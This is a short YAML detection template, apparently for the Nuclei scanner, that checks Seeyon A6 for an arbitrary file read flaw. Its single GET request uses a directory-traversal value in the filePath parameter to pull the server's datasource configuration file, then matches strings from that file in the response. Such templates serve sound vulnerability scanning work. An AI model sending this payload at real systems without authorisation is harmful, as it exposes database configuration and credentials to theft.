id: seeyon-a6-directory-traversal
info:
  name: Seeyon A6 Arbitrary File Read Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-read
http:
  - method: GET
    path:
      - "{{BaseURL}}/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "workflow.dialect"
        part: body
      - type: word
        words:
          - "ctpDataSource.url"
        part: body
